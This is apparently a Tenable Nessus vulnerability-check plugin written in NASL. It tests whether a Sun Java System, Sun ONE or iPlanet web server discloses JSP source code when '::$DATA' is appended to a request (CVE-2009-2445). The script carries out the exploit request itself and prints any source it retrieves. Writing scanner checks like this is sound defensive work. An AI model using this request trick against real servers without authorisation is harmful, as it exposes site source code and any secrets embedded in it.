#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(39618);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2009-2445");
  script_bugtraq_id(35577);
  script_osvdb_id(55655);
  script_xref(name:"Secunia", value:"35701");

  script_name(english:"Sun Java System Web Server ::$DATA Extension Request JSP Resource Disclosure");
  script_summary(english:"Tries to exploit a source code disclosure vulnerability.");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a source code disclosure
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote Sun Java System Web Server (or an older version, such as
Sun ONE Web Server or iPlanet) reveals the source code of '.jsp' files
when an attacker appends '::$DATA' to the request.");
  script_set_attribute(attribute:"see_also", value:"http://isowarez.de/SunOne_Webserver.txt" );
  script_set_attribute(attribute:"see_also", value:"http://download.oracle.com/sunalerts/1020872.1.html" );
  script_set_attribute(attribute:"solution", value:
"Apply the appropriate patch or workaround referenced in Sun's
advisory." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(200);
  script_set_attribute(
    attribute:"vuln_publication_date", 
    value:"2009/07/06"
  );
  script_set_attribute(
    attribute:"patch_publication_date", 
    value:"2009/08/27"
  );
  script_set_attribute(
    attribute:"plugin_publication_date", 
    value:"2009/07/07"
  );
 script_cvs_date("$Date: 2015/09/24 23:21:21 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");
 
  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

os = get_kb_item("Host/OS");
if (os && "Microsoft Windows" >!< os) exit(0);

port = get_http_port(default:80);

if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (
    !banner || 
    (
      "Sun-Java-System-Web-Server" >!< banner && 
      "Sun-ONE-Web-Server" >!< banner && 
      "iPlanet-WebServer" >!< banner
    )
  ) exit(0);
}

files = get_kb_list(string("www/", port, "/content/extensions/jsp"));
if (isnull(files)) exit(0);
files = make_list(files); 

foreach file (files)
{
  # Find a JSP page that doesn't have '<%=' in it.
  res = http_send_recv3(method:"GET", item:file, port:port);
  if (isnull(res)) exit(0);

  if ("200" >< res[0] && "<%=" >!< res[2])
  {
    file = string(file,"::$DATA");
    res = http_send_recv3(method:"GET", item:file, port:port);
    if (isnull(res)) exit(0);

    if ("<%=" >< res[2] && "%>" >< res[2]) 
    {
      if(report_verbosity > 0)
      {
        report = string(
          "\n",
          "Nessus was able to exploit the issue using the following URL :\n",
          "\n",
          "  ", build_url(port:port, qs:file), "\n"
        );
        if (report_verbosity > 1)
        {
          report = string(
            report,
            "\n",
            "Here is the JSP source :\n",
            "\n",
            res[2]);
        }
       security_warning(port:port, extra:report);
      }
      else security_warning(port);
    }

    # nb: we found one such page -- no need to test any further.
    exit(0);
  } 
}
